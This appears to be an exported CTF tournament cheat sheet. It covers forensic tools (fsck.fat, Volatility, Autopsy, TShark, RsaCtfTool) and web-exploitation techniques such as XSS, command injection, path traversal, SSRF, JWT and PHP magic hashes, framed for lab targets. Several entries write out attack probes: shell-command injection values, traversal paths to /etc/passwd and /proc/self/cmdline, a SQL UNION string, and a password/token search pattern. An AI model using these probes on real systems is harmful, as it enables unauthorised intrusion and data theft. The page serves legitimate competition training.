Run in: WSL. Despite the tournament category, this is a filesystem tool.

Diagnose without changes

# Use a FAT filesystem image, not an entire partitioned disk
fsck.fat -n -v fat.img

# Also list processed paths
fsck.fat -n -l fat.img

-n performs a noninteractive check without writing. Keep this option for initial triage.

Walkthrough: damaged FAT challenge

  1. Identify whether the artifact contains a partition table with mmls.
  2. If partitioned, extract the FAT partition first.
  3. Run the read-only check and save the diagnosis.
  4. Use Sleuth Kit to inspect recoverable entries.
  5. If repair is needed, do it on a copy and compare recovery results.
# Example partition boundaries only: use values from YOUR image
dd if=disk.img of=fat.img bs=512 skip=2048 count=65536 status=none
fsck.fat -n -v fat.img > fat_check.txt 2>&1

# Repair the copy interactively
cp fat.img fat_work.img
fsck.fat -r fat_work.img

Gotchas

  • Repair can change directory entries, cluster chains and deleted evidence.
  • Confirm sector size before using dd; 512 is only this example’s assumption.
  • Do not run against a mounted filesystem or unrelated host drive.
  • For file recovery, continue with The Sleuth Kit or Autopsy.

Flags explained

Flag Meaning
-n Check without writing changes; noninteractive
-v Show verbose diagnostic information
-l List paths while processing
-r Repair interactively; can modify the filesystem

-r means repair here, not recursive traversal. For a forensic artifact, run read-only diagnosis first and repair only a working copy.

item.title: PNG & JPEG Structure
item.description:
PNG and JPEG container clues

Separate container bytes, metadata and decoded samples. Each offers a different hiding place.

1. PNG chunk layout

8-byte PNG signature
repeated:
    4-byte big-endian data length
    4-byte ASCII chunk type
    N bytes of data
    4-byte CRC over type + data
Chunk What to inspect
IHDR Width, height, bit depth, color type, interlace
PLTE Palette entries; index patterns may be meaningful
IDAT Parts of the compressed image datastream, not plaintext pixel rows
tEXt, zTXt, iTXt Textual metadata, sometimes compressed
tRNS Transparency information for relevant color types
IEND End of the PNG datastream
Unknown ancillary chunk Inspect type, length, contents and CRC; unknown does not automatically mean malicious

PNG compression and per-row filters must be decoded before interpreting pixel LSB. The PNG specification defines chunk CRCs, image filtering and datastream boundaries.

item.title: RsaCtfTool
item.description:
Use for: weak RSA keys, known RSA attack patterns and private key recovery.
Run in: WSL; Python based tool.

Check the entry point first

# Current upstream CLI
RsaCtfTool --help

# Older supplied checkouts may instead use:
# python3 /path/to/RsaCtfTool.py --help

Use the installed version’s help. Recent upstream uses --decryptfile; older examples often use --uncipherfile.

Inspect a public key

RsaCtfTool --dumpkey --key public.pem
openssl pkey -pubin -in public.pem -text -noout

Try a relevant attack

# General weak-key recovery
RsaCtfTool --publickey public.pem --private

# Small private exponent candidate
RsaCtfTool --publickey public.pem --attack wiener --private

# Multiple supplied public keys
RsaCtfTool --publickey '*.pub' --private

Decrypt challenge ciphertext

RsaCtfTool --publickey public.pem --decryptfile ciphertext.bin

Confirm whether the challenge ciphertext is raw bytes, hex, Base64 or an integer before supplying it.

item.title: XSS · Context Before Payload
item.description:
Cross-site scripting

Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data. Reflection in JSON or escaped HTML alone is not XSS.

1. Map source and sink

Submit a unique marker such as CTF_MARK_731. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect location.search, location.hash, postMessage, storage and JSON fetch responses.

item.title: Volatility 3
item.description:
Use for: processes, command lines, network state and files in memory dumps.
Run in: WSL. Examples use python3 vol.py from the installed checkout; a packaged installation may provide vol instead.

Discover plugins and identify Windows memory

python3 vol.py -h
python3 vol.py -f /path/to/memory.raw windows.info

Global options such as -f, -o, -r, -p, and -s go before the plugin name. Use absolute artifact paths if running from the tool directory.

Windows CTF triage

# Active processes and parent relationships
python3 vol.py -f /path/to/memory.raw windows.pslist
python3 vol.py -f /path/to/memory.raw windows.pstree

# Scan for process objects and inspect command lines
python3 vol.py -f /path/to/memory.raw windows.psscan
python3 vol.py -f /path/to/memory.raw windows.cmdline

# Network objects and file objects
python3 vol.py -f /path/to/memory.raw windows.netscan
python3 vol.py -f /path/to/memory.raw windows.filescan

Extract files associated with a process

mkdir -p /tmp/vol_out

# Replace 1234 with the PID found during triage
python3 vol.py -f /path/to/memory.raw -o /tmp/vol_out \
  windows.dumpfiles --pid 1234

Export structured output

python3 vol.py -f /path/to/memory.raw -r json windows.pslist > processes.json

Linux memory

python3 vol.py -f /path/to/linux.raw banners
python3 vol.py -f /path/to/linux.raw linux.pslist
python3 vol.py -f /path/to/linux.raw linux.pstree

Linux plugins require matching kernel symbols. Windows symbols can also need an available symbol cache or download access.

item.title: OpenSSH-Session-Key-Recovery
item.description:
Use for: recovering SSH cipher keys and IVs from a Linux memory image.
Run in: the supplied Volatility 3 installation in WSL. This entry is a plugin, not an independent CLI.

Required inputs

  • Linux memory containing the relevant OpenSSH process/session state.
  • Matching Linux kernel symbols for Volatility.
  • Plugin openssh_sessionkeys.py and its openssh32/openssh64 symbol files.
  • A matching PCAP if the challenge also requires traffic decryption.

Discover the installed plugin

# From the supplied Volatility directory
python3 vol.py -h | grep -i ssh
python3 vol.py -f /path/to/linux.raw linux.pslist

Recover keys from sshd

# For a plugin integrated under the linux namespace
python3 vol.py -f /path/to/linux.raw \
  linux.openssh_sessionkeys.SSHKeys --name sshd --out /tmp/ssh_keys.jsonl

Use the exact name listed in -h. An externally loaded plugin may appear as openssh_sessionkeys.SSHKeys instead.

item.title: x64dbg
item.description:
Use for: native Windows executable debugging, comparisons and runtime decoding.
Run in: Windows portable build. Use x64dbg for 64-bit, x32dbg for 32-bit targets.

Launch with a target

# Run from the extracted debugger folder; adjust the actual location
.\x64dbg.exe 'C:\CTF\challenge.exe'

Useful controls

Action Default key
Open executable F3
Run / continue F9
Toggle breakpoint at selection F2
Step into F7
Step over F8
Execute until return Ctrl+F9
Restart Ctrl+F2

Walkthrough: find the check

  1. Open the executable and run to its relevant code.
  2. In the CPU disassembly, search the current module for string references.
  3. Find the failure/success message and follow its references.
  4. Set a breakpoint near the input comparison and run with a test value.
  5. Inspect registers, stack and pointed-to memory.
  6. Follow decoded strings or buffers in the dump view.
  7. Record the transformation and reproduce it in Python.

Debugger command bar examples

bp kernel32.GetProcAddress
bp kernel32.LoadLibraryA

These help locate dynamically resolved APIs when the relevant exports are loaded and resolvable.

item.title: Autopsy
item.description:
Use for: disk image browsing, deleted files, browser history and timelines.
Run in: Windows GUI. Uses The Sleuth Kit and additional ingest modules.

Walkthrough: investigate a disk image

  1. New Case → choose a case name and a separate output directory.
  2. Add Data Source → Disk Image or VM File → select the artifact.
  3. Set the source timezone from the challenge information.
  4. Select relevant ingest modules and start processing.
  5. Browse Data Sources, Views, and Results as results appear.
  6. Search the expected flag prefix and challenge keywords.
  7. Export useful files with Extract File(s) and record their source paths.

Where to look

Question Useful view/module
What was deleted? Deleted file entries / filesystem views
What did the user browse? Recent Activity / web artifacts
Is a file extension misleading? File Type Identification / Extension Mismatch
What happened at a given time? Timeline
Is there hidden text or a named secret? Keyword Search
Is an archive/document carrying another file? Embedded File Extraction

Fast CTF workflow

Start with likely user folders, downloads and deleted entries. Add focused searches while ingest runs. Correlate a hit with its full path, timestamps and neighboring artifacts.

item.title: HxD
item.description:
Use for: raw byte inspection, file signatures, offsets and small patches.
Run in: Windows GUI; installer or portable build.

Walkthrough: inspect a suspicious file

  1. File → Open the artifact.
  2. Compare the first bytes with its claimed format.
  3. Search → Find → choose Text-string or Hex-values.
  4. Use Search → Goto to jump to a known offset.
  5. Inspect the data interpreter for selected integer/float values.
  6. Save edits as a separate working copy.

File signatures to recognize

Format Leading bytes
PNG 89 50 4E 47 0D 0A 1A 0A
JPEG FF D8 FF
ZIP local header 50 4B 03 04
PDF 25 50 44 46 2D (%PDF-)
ELF 7F 45 4C 46
Windows executable 4D 5A (MZ); verify the later PE header

CTF: repair a known bad header

Compare with the expected format → select the exact damaged bytes → overwrite in a copy → reopen with the relevant viewer/parser. A matching signature alone does not prove the rest of the file is valid.

item.title: TShark
item.description:
Use for: repeatable PCAP filtering, field extraction and stream recovery.
Run in: Windows PowerShell; included with the approved Wireshark installation.

Set the executable path

$Tshark = 'C:\Program Files\Wireshark\tshark.exe'
& $Tshark --version

If already on PATH, replace & $Tshark with tshark. These commands also work with a supplied WSL binary after adapting shell syntax.

Triage protocols and conversations

& $Tshark -r .\traffic.pcapng -q -z io,phs
& $Tshark -r .\traffic.pcapng -q -z conv,tcp
& $Tshark -r .\traffic.pcapng -q -z endpoints,ip

Extract DNS and HTTP fields

& $Tshark -r .\traffic.pcapng -Y 'dns.flags.response == 0' `
  -T fields -e frame.number -e ip.src -e dns.qry.name

& $Tshark -r .\traffic.pcapng -Y 'http.request' `
  -T fields -e tcp.stream -e http.host -e http.request.uri

Read a stream or save selected packets

# Replace 0 with the relevant stream index
& $Tshark -r .\traffic.pcapng -q -z 'follow,tcp,ascii,0'

& $Tshark -r .\traffic.pcapng -Y 'tcp.stream eq 0' -w .\stream0.pcapng

Export HTTP objects

New-Item -ItemType Directory -Force .\http_objects | Out-Null
& $Tshark -r .\traffic.pcapng --export-objects 'http,http_objects'

CTF gotchas

  • -Y is a display filter; -f is a capture filter.
  • -w saves packets, not decoded text.
  • Live capture needs an appropriate interface/driver; offline -r does not.
  • PowerShell continuation uses a backtick at line end, with no trailing space.

Flags used on this page

Flag Meaning Example
-r FILE Read an existing capture -r traffic.pcapng
-Y EXPR Select decoded packets with a display filter -Y 'dns'
-f EXPR Apply capture filter during live capture -f 'tcp port 80'
-T fields Emit selected protocol fields Pair with -e
-e FIELD Add one output field; repeat it -e ip.src
-E KEY=VALUE Configure fields formatting -E header=y
-q Suppress ordinary packet summaries Useful with -z
-z STAT Generate statistics or follow a stream -z conv,tcp
-w FILE Save packets in capture format Not a text report
-V Show full decoded packet details Useful for one filtered frame
-x Include a hex/ASCII byte dump Inspect wire bytes
-d RULE Force protocol decode for a port tcp.port==8081,http
-G fields List recognized field names Resolve version differences
--export-objects TYPE,DIR Save supported reassembled objects http,http_objects

CTF: produce a CSV of HTTP requests

& $Tshark -r .\traffic.pcapng -Y 'http.request' `
  -T fields -E header=y -E separator=, -E quote=d `
  -e frame.number -e ip.src -e tcp.stream -e http.host -e http.request.uri |
  Set-Content -Encoding utf8 .\http_requests.csv

header=y prints names, separator=, chooses commas, and quote=d quotes fields with double quotes. This is a text export; shell text encoding is appropriate here.

item.title: Notepad++
item.description:
Use for: source/log inspection, regular expression searches and small text edits.
Run in: Windows GUI.

Open an artifact from PowerShell

# If installed in the default location
& 'C:\Program Files\Notepad++\notepad++.exe' 'C:\CTF\output.txt'

Useful keys

Action Key
Find Ctrl+F
Replace Ctrl+H
Find in files Ctrl+Shift+F
Go to line Ctrl+G

CTF: search a text dump

  1. Open the extracted text or source file.
  2. Ctrl+F → Search Mode → Regular expression.
  3. Search a pattern below.
  4. Choose Find All in Current Document for a list of matches.
flag\{[^}\r\n]+\}
https?://[^\s"'<>]+
(?i)(password|secret|token|api[_-]?key)

Replace flag with the tournament’s actual prefix.

item.title: dnSpyEx (dnSpy)
item.description:
Use for: decompiling/debugging managed .NET applications and assemblies.
Run in: Windows portable build. The supplied list specifies the self-contained win64 package.

Open an assembly

# Run from the extracted dnSpy directory
.\dnSpy.exe 'C:\CTF\challenge.exe'

Walkthrough: recover a .NET check

  1. Open the EXE/DLL and expand the assembly tree.
  2. Find the entry point or UI event handler, such as a button click.
  3. Search strings for success/failure messages or the expected flag prefix.
  4. Follow the check into its methods and inspect constants/resources.
  5. Set a breakpoint before or after a transformation.
  6. Start debugging through Debug → Start with the proper runtime/arguments.
  7. Inspect locals, arguments and decoded arrays at the breakpoint.
  8. Reproduce the algorithm or save the relevant decoded bytes.

Places to inspect

Location Possible clue
Main / startup code Argument checks, initialization
UI event handlers Password/serial validation
Static constructors Hidden constants, initialization routines
Resources Embedded files and encrypted payloads
Convert.FromBase64String callers Encoded values
Crypto API callers Mode, key, IV and transformation

Editing a working copy

Use Edit Method or IL editing when available, then Save Module to a separate file. Record the original logic first.

item.title: Eric Zimmerman's Tools
item.description:
Use for: Windows artifact parsing and forensic timelines.
Run in: Windows PowerShell, from the directory containing the supplied executables. Available tools/builds depend on the organizer’s installation.

Choose a parser

Artifact Tool What it helps answer
Prefetch .pf PECmd Program execution traces
Event logs .evtx EvtxECmd Logons, process/service events
NTFS $MFT / $J MFTECmd File records and filesystem changes
Shortcut .lnk LECmd Target path and link metadata
Jump Lists JLECmd Recently accessed application items
Registry hives RECmd / Registry Explorer Configuration and user activity
Generated CSV Timeline Explorer Sort/filter parsed results

Parse execution and event artifacts

# Replace C:\CTF\evidence with your extracted artifact folder
.\PECmd.exe -d 'C:\CTF\evidence\Prefetch' --csv 'C:\CTF\out\prefetch'
.\EvtxECmd.exe -d 'C:\CTF\evidence\evtx' --csv 'C:\CTF\out\events'

Parse filesystem and recent-file traces

# Single quotes preserve the literal $MFT name in PowerShell
.\MFTECmd.exe -f 'C:\CTF\evidence\$MFT' --csv 'C:\CTF\out\mft'
.\LECmd.exe -d 'C:\CTF\evidence\Recent' --csv 'C:\CTF\out\lnk'
.\JLECmd.exe -d 'C:\CTF\evidence\AutomaticDestinations' --csv 'C:\CTF\out\jumplists'

CTF walkthrough

  1. Identify the supplied artifact, then select its parser.
  2. Run TOOL.exe -h for the installed build’s options.
  3. Export CSV into a separate output folder.
  4. Open it in Timeline Explorer if supplied, or inspect it with PowerShell:
Get-ChildItem 'C:\CTF\out' -Recurse -Filter *.csv
Import-Csv 'C:\CTF\out\events\chosen-output.csv' | Select-Object -First 5

Correlate timestamps, paths, users and IDs across artifacts. Prefetch presence supports execution analysis but does not alone establish who ran a program or its intent.

item.title: Archives & File Carving
item.description:
Archives, appended payloads and carving

A signature gives a possible start. Format structure gives an extent. A successful parser/checksum gives confidence.

1. Find candidate offsets

binwalk carrier.bin
strings -a -n 6 -t x carrier.bin
xxd -s 0x1000 -l 128 carrier.bin
python3 file_carver.py scan carrier.bin
python3 file_carver.py scan carrier.bin --magic 504b0304 --max-hits 20

Download file_carver.py; it uses only Python’s standard library. Its built-in signatures cover PNG, JPEG, ZIP local headers/end records, gzip, xz, PDF and RIFF. Scanning reports candidates and never auto-extracts.

item.title: Auth & IDOR · Compare Two Accounts
item.description:
Authentication, authorization and IDOR

Use two accounts and known object IDs. The strongest first test is whether account B can read one private object created by account A. Guessing lots of IDs is less informative.

1. Build a small ownership matrix

Request Expected
A token → A private object Allowed
B token → B private object Allowed
B token → A private object Denied
No token → A private object Denied

Keep cookies separate in browser profiles or Repeater tabs. Verify identity at /me before each comparison. Public profiles are not automatically IDOR; test data intended to be private.

item.title: JWT · Claims, Algorithms & Keys
item.description:
JWT attacks

Decode → identify consumer → test signature enforcement → inspect key selection → check claims. Base64url decoding reveals data; it does not recover the signing key.

1. Recognize the format

A common signed compact token has three dot-separated parts:

BASE64URL(header).BASE64URL(payload).BASE64URL(signature)

A five-part token may be encrypted JWE; do not apply three-part JWS edits blindly. Opaque random session strings are a different format.

Example decoded data:

{"alg":"HS256","typ":"JWT"}
{"sub":"12","role":"user","iss":"ctf-app","aud":"web","exp":1900000000}

Use an available offline Base64url/JWT inspector. Ordinary base64 uses +/ while base64url uses -_; padding is commonly omitted. JSON formatting changes signed bytes. Do not upload live challenge tokens to public decoding websites.

item.title: OAuth / Account Linking
item.description:
OAuth and Account Linking

Map who issues each value and which browser/session it belongs to. A code, access token, ID token, email claim, and application session cookie are different credentials.

1. Record the whole normal flow

Browser → client /login
Client → provider /authorize
Provider → client callback?code=...&state=...
Client server → provider token endpoint
Client → authenticated application session

Typical authorization request:

GET /authorize?response_type=code&client_id=client123&redirect_uri=https%3A%2F%2Fctf.invalid%2Fcallback&scope=openid%20profile&state=RANDOM_STATE&code_challenge=PKCE_CHALLENGE&code_challenge_method=S256 HTTP/1.1
Host: provider.ctf.invalid

Capture the actual URL. Note state, nonce for OpenID Connect, and PKCE challenge/verifier if present. Never infer which controls are enforced just because a parameter appears.

item.title: Audio: Samples & Spectrograms
item.description:
Audio steganography

Identify encoding, channels and sample width before interpreting sound bytes. Metadata, appended files, spectrogram drawings, sample LSB and timing codes need different extraction paths.

1. Triage and PCM inspection

exiftool -a -u -g1 audio.wav
strings -a -n 6 -t x audio.wav
binwalk audio.wav

For an uncompressed PCM WAV, standard-library Python can inspect the actual audio frames:

import wave
with wave.open("audio.wav", "rb") as w:
    print("channels", w.getnchannels(), "width_bytes", w.getsampwidth(),
          "rate", w.getframerate(), "frames", w.getnframes(),
          "compression", w.getcomptype())
    print("duration", w.getnframes() / w.getframerate())

wave support varies by Python version; older releases do not handle all float/extensible WAV variants. MP3/FLAC are not WAV because their filenames change. Read Python’s WAV support for the installed release.

item.title: Prototype Pollution · Source to Gadget
item.description:
JavaScript prototype pollution

Pollution source → inherited property proof → reachable gadget → visible effect. An object containing a key named __proto__ is not by itself proof that any prototype changed.

1. Where to look

Inspect recursive merge, config update, query-string-to-object, dot/bracket path setters and JSON import features. Look in client bundles for merge, defaultsDeep, set, parse, Object.assign and recursive property copying. Inspect dependency versions when source is provided.

Vulnerable shape to recognize:

item.title: GraphQL · Schema to Resolver
item.description:
GraphQL manual testing

Endpoint → valid operation → schema → exact fields/arguments → resolver authorization. Introspection reveals structure; it does not by itself grant access.

1. Find and confirm

Look in frontend network requests before trying common /graphql, /api/graphql, /gql paths. A GraphiQL/Apollo UI may show history or schema documentation.

POST /graphql HTTP/1.1
Host: ctf.invalid
Content-Type: application/json

{"query":"query { __typename }"}

Expected example: {"data":{"__typename":"Query"}}. A 200 OK response may still contain an errors array. GraphQL field errors can coexist with partial data.

item.title: CSRF & CORS · Send vs Read
item.description:
CSRF and CORS

CSRF asks whether another site can cause an authenticated action. CORS asks whether that site’s JavaScript can read the response. Demonstrate them in an actual browser; Repeater does not enforce browser security rules.

1. Record the prerequisites

State-changing route and method:
Content type:
Authentication: automatic cookie, HTTP auth, or explicit bearer header?
CSRF token: where generated, where checked, bound to which session?
Cookie SameSite / Secure / domain / path:
Origin / Referer checks:
Actual browser result:

Bearer tokens added by the normal frontend from its own storage are not automatically added by an attacker origin. Cookies may be, subject to SameSite and third-party cookie policy.

item.title: WebSockets / Live Sessions
item.description:
WebSockets and Live Sessions

A successful upgrade is only the start. Preserve message order, session state, sequence IDs, and asynchronous responses through the challenge’s final result.

1. Capture the actual protocol

Browser DevTools → Network → WS → Messages, or Burp’s WebSocket history.

GET /socket HTTP/1.1
Host: ctf.invalid
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://ctf.invalid
Cookie: session=YOUR_SESSION

That key is the RFC example. A real client generates a fresh key and handles the handshake. Do not send an arbitrary HTTP body after upgrading and assume it is a valid WebSocket frame. Browser/client libraries mask client frames, handle fragmentation, and respond to control frames.

item.title: Command Injection
item.description:
Command injection

First find whether input reaches a shell, an executable argument, or only application logic. Ping, traceroute, DNS, archive, image conversion, PDF and Git wrappers are common sinks.

1. First test → control → interpretation

Start from a working request and preserve its other fields.

Probe value Control Meaning if repeatable
127.0.0.1;printf CTF_A71 127.0.0.1;printf CTF_B82 Changed output marker suggests a POSIX shell
127.0.0.1;sleep 3 127.0.0.1;sleep 0 Repeatable added delay suggests execution; compare several pairs
127.0.0.1&&printf CTF_A71 Valid normal host RHS needs the original command to succeed
`invalid-host printf CTF_A71`
127.0.0.1&echo CTF_A71 Change marker Candidate Windows cmd.exe; & also has different POSIX semantics

An echoed payload is not execution. The marker must be produced by the command, or its timing must track the requested delay. Do not diagnose injection from a slow DNS lookup alone.

item.title: PDF & Office Documents
item.description:
PDF and document hiding places

Start with metadata, extracted text and attachments. A document that looks blank may contain ordinary invisible text, compressed streams, prior revisions or embedded files.

1. First inspection

exiftool -a -u -g1 challenge.pdf
pdftotext -layout challenge.pdf layout.txt
pdftotext -raw challenge.pdf raw.txt
qpdf --check challenge.pdf
qpdf --show-encryption challenge.pdf
qpdf --show-npages challenge.pdf

Compare viewer appearance with both text extraction modes. The visual layout can reorder characters relative to stream order. A scanned page may have no text until OCR, while an OCR layer may contain text absent from the visible image.

item.title: Traversal & LFI
item.description:
Path traversal and local file inclusion

Prove a file read before trying code execution. A download function may only read bytes; a PHP include also interprets PHP code. Those are different capabilities.

1. First probes

Candidate parameters: file, filename, path, page, template, lang, image/download IDs that contain paths.

Raw value Control Evidence
../../../../etc/passwd Same traversal to etc/ctf-does-not-exist Recognizable account file vs missing-file response
/etc/passwd /etc/ctf-does-not-exist Absolute path accepted by the file operation
..\..\..\Windows\win.ini Missing .ini path Windows path traversal, if its contents return
../../../../proc/self/cmdline Missing proc path Linux process arguments, possibly NUL-separated

Start with one ../, then add depth while retaining the filename. A 200 OK page containing a fixed error is a negative result. Match real file contents and compare a nonexistent path.

item.title: SSRF
item.description:
Server-side request forgery

Establish that the server fetches a URL, then identify the URL parser, protocol and network location. Typical sinks: previews, webhook testers, imports, stock checks, image/PDF renderers.

1. First probe and control

Give the endpoint a unique path on a challenge-provided callback service:

http://YOUR-LAB-HOST/ssrf-marker-71

Then compare an ordinary valid fetch and an intentionally missing path. Inspect request method, headers, source and callback timing. A browser loading your image is not a server fetch; submit the same request in Repeater without rendering the page.

item.title: XXE & XML Parsers
item.description:
XML external entity injection

Prove XML processing, then entity expansion, then external resource access. Each step establishes a different capability.

1. Establish the parsing surface

Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application’s real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.

<?xml version="1.0"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

Use the original accepted Content-Type, normally application/xml or text/xml. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.

item.title: File Upload
item.description:
File upload

Track four stages separately: accepted → stored → reachable → interpreted. An upload success message proves only the first stage.

1. Establish the normal path

Upload an allowed small file with a unique marker. Save the multipart request, response URL, final stored filename and retrieval response headers. Compare the retrieved bytes with the original: resizing/re-encoding can remove appended content and metadata.

POST /upload HTTP/1.1
Host: ctf.invalid
Content-Type: multipart/form-data; boundary=ctf71

--ctf71
Content-Disposition: form-data; name="file"; filename="marker.txt"
Content-Type: text/plain

CTF_UPLOAD_71
--ctf71--

Keep other required fields, cookies and CSRF tokens from the captured request. Let Repeater update Content-Length. Multipart delimiters use the exact declared boundary with two leading dashes; the last delimiter has two trailing dashes.

item.title: Deserialization
item.description:
Insecure deserialization

Identify the format and actual decoder before changing bytes. Base64 is an encoding, not a serializer; an unsigned JSON cookie may be plain data tampering rather than object injection.

1. Find and unwrap the input

Look at cookies, saved preferences, cart/import blobs, queue messages and backup uploads. Save the original bytes before editing.

Transport decoding → Base64/hex if present → compression if present → serialization

Decode only layers supported by evidence. Re-encode in reverse order after a single small change. A signature/MAC must still validate; knowing its encoding does not let you forge it.

item.title: Text, Whitespace & Unicode
item.description:
Text, whitespace and Unicode channels

Inspect code points and raw bytes before normalizing or copying text. The displayed sentence may hide a different logical character sequence.

1. First inspection

xxd -l 256 message.txt
python3 text_unicode.py message.txt --limit 200

Download text_unicode.py. It uses only the standard library. Suspicious characters are printed using escaped representations and Unicode names, so BiDi controls cannot silently reorder the terminal report.

index=12 U+200B escaped='\u200b' category=Cf bidi='BN' name=ZERO WIDTH SPACE total=64

The index counts decoded code points, not raw byte offsets or visual columns. The script does not strip, normalize or repair text. Invalid UTF-8 is a diagnostic failure: identify the actual encoding instead of dropping bytes with errors="ignore".

item.title: Business Logic & Races
item.description:
Business logic and race conditions

Write the invariant first: “one account may redeem this code once,” “the charged amount equals the server’s product price,” or “a completed order cannot change owner.” Then build the smallest request sequence that violates it.

1. Map the intended workflow

Register → verify identity → add item → apply coupon → pay → confirm → download

Capture every request and object ID. Note which endpoint changes state, which values come from the client and which checks depend on previous steps. A disabled button is not a server check.

item.title: HTTP, Cache & Smuggling
item.description:
HTTP parsing, cache issues and request smuggling

Map the components: browser → CDN/cache → reverse proxy → application. Ask what each considers the host, path, cache key and end of the request.

1. Establish a baseline

Capture the exact HTTP version, route and response headers. Repeat the request to see whether a cache is present.

GET /?probe=cache71 HTTP/1.1
Host: ctf.invalid

Inspect Age, Via, X-Cache, cache-status headers, Cache-Control and Vary. A missing cache header does not establish absence of caching; a header saying HIT is still weaker evidence than a controlled stored response difference.

item.title: PHP · Types / Hashes / Parsers
item.description:
PHP Quirks

Read the comparison, PHP version, and input parser before choosing a trick. Many classic PHP CTF payloads changed behavior in PHP 8.

1. Loose comparison and magic hashes

Vulnerable source pattern:

if (md5($input) == $stored_hash) { /* challenge gate */ }

Two known MD5 inputs:

240610708  → 0e462097431906509019562988736854
QNKCDZO    → 0e830400451993494058024219903391

Both digests look like numeric scientific notation for zero. Comparing those digest strings using == can treat them as equal even on modern PHP. === compares string identity and prevents this particular bypass.

item.title: LDAP / XPath Injection
item.description:
LDAP and XPath Injection

These query languages do not share SQL grammar. Quotes, comments, schema discovery, and wildcard meaning depend on the actual parser.

LDAP: identify a filter string

Possible source:

(uid=INPUT)
(&(uid=USERINPUT)(userPassword=PASSINPUT))

Useful first probes for a search filter:

alice
*
alice*
(
)
\
Result Interpretation
* returns many entries Wildcard accepted, possibly intended search behavior
Unbalanced ( or ) gives filter syntax error Potential filter-string construction
Structured filter injection changes logic Stronger evidence of LDAP injection

item.title: Open Redirect / URL Parsing
item.description:
Open Redirect and URL Parsing

Look for next, return, redirect, url, continue, callback, or client-side navigation reading a URL parameter.

1. Establish the navigation sink

GET /login?next=%2Fprofile HTTP/1.1
Host: ctf.invalid

Determine whether navigation is:

  • An HTTP Location header on a 3xx response.
  • An HTML <meta http-equiv="refresh">.
  • A JavaScript assignment such as location = input.
  • A link that only navigates when clicked.

Reflection in an anchor or message is not automatic redirection. Inspect the actual destination in the browser as well as the response headers.

item.title: Offline Python Toolkit
item.description:
Offline Python steganography toolkit

Download helpers before the event and rehearse with a known message. These tools do not use network requests or AI. Whether prewritten scripts and optional packages are permitted is determined by your event’s rules.

1. Downloadable helpers

Helper Dependencies Purpose
file_carver.py Standard library Signature candidate scan and explicit bounded-range extraction
image_lsb.py Optional Pillow Channel/plane bit extraction and lossless visible bit-plane PNG
text_unicode.py Standard library Escaped Unicode inspection and two-code-point bitstream extraction

Use Python 3.9 or later. All three accept --help, preserve the source and refuse to overwrite an existing output. Work from downloaded local copies:

item.title: Encoding & Filter Bypasses
item.description:
Encoding, filters and parser differences

Write down the bytes at each layer. Most failed payloads come from the wrong context, a changed transport encoding, or a bypass aimed at a parser the input never reaches.

Your editor → HTTP transport → URL/form/JSON decoder → validation
→ framework parsing → query/template/shell/path parser → output encoding

Move validation in that diagram if source shows a different order. The same %27 can be a quote, literal text, or a blocked token depending on the point inspected.

item.title: Python · Reusable Web Helpers
item.description:
Reusable Python for Web CTFs

Prepared snippets for offline notes. The two downloads use the Python standard library. They do not need AI, an API key, or package installation. Use the event-permitted runtime and follow the event’s rules on saved code.

Download Purpose Network access
web_helpers.py Hex, Base64, URL, XOR, hashes, JWT inspection / known-key HS256 signing None
sqli_boolean.py Extract one scalar using an already-proven boolean GET oracle Only the endpoint you supply

1. Exact bytes in and out

python web_helpers.py hex-decode --text 666c61677b64656d6f7d --output decoded.bin
python web_helpers.py b64-decode --text 'ZmxhZ3tkZW1vfQ==' --output decoded.bin
python web_helpers.py url-encode --text "' UNION SELECT NULL-- -"
python web_helpers.py xor --file cipher.bin --key-hex 494345 --output plain.bin
python web_helpers.py hashes --file sample.bin

The helper does not add a newline to binary output. --text means UTF-8 text, --file means actual bytes, and --key-hex 494345 means the three bytes ICE, not the six ASCII characters 494345.
